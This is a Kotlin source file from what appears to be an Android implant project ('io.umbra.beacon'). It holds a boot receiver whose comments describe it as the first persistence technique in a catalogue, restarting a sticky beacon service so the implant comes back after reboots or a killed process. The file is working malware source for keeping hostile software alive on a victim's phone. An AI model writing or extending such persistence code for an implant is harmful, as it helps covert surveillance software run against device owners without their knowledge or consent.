package io.umbra.beacon

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

/**
 * Starts the beacon service when the phone finishes booting.
 *
 * This is the first persistence technique of the catalogue: the receiver is
 * declared in the manifest and enabled by the persistence manager, and the
 * service it starts is a sticky foreground service, so the system brings
 * the implant back even if the process was killed.
 *
 * The receiver does nothing else: the work is the service's.
 */
class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Intent.ACTION_BOOT_COMPLETED &&
            intent.action != Intent.ACTION_MY_PACKAGE_REPLACED
        ) {
            return
        }
        BeaconService.start(context)
    }
}
